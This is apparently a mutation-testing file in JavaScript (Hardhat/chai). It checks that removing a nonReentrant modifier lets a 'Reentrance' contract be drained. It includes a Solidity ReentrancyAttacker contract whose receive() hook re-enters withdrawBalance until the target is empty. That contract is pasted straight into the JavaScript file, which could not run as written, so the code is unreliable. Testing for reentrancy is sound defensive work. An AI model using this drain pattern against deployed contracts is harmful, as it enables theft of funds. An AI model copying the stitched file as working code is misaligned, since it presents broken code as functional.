import { expect } from "chai";
import { ethers } from "hardhat";

describe("Reentrance mutant detection - mbb2c62a6", function () {
  it("should detect reentrancy vulnerability when nonReentrant modifier is removed", async function () {
    const [owner, attacker] = await ethers.getSigners();
    
    // Deploy the Reentrance contract (no constructor arguments needed)
    const Factory = await ethers.getContractFactory("Reentrance");
    const instance = await Factory.deploy();
    await instance.waitForDeployment();
    const contractAddress = await instance.getAddress();

    // Fund the contract with some ether
    await owner.sendTransaction({
      to: contractAddress,
      value: ethers.parseEther("10")
    });

    // Deploy attacker contract
    const AttackerFactory = await ethers.getContractFactory("ReentrancyAttacker");
    const attackerContract = await AttackerFactory.deploy(contractAddress);
    await attackerContract.waitForDeployment();

    // Attacker deposits 1 ether to have a balance to withdraw
    await attackerContract.connect(attacker).deposit({ value: ethers.parseEther("1") });

    // Get initial balance of attacker contract
    const initialBalance = await ethers.provider.getBalance(attackerContract.getAddress());

    // Execute the attack - this should drain the contract if reentrancy is possible
    await attackerContract.connect(attacker).attack();

    // Get final balance of attacker contract
    const finalBalance = await ethers.provider.getBalance(attackerContract.getAddress());

    // Verify the attacker drained more than their deposit (successful reentrancy)
    expect(finalBalance - initialBalance).to.be.gt(ethers.parseEther("1"));
  });
});

// Attacker contract for reentrancy test
contract ReentrancyAttacker {
    Reentrance public target;
    
    constructor(address _target) {
        target = Reentrance(_target);
    }
    
    function deposit() external payable {
        target.addToBalance{value: msg.value}();
    }
    
    function attack() external {
        target.withdrawBalance();
    }
    
    receive() external payable {
        if (address(target).balance > 0) {
            target.withdrawBalance();
        }
    }
}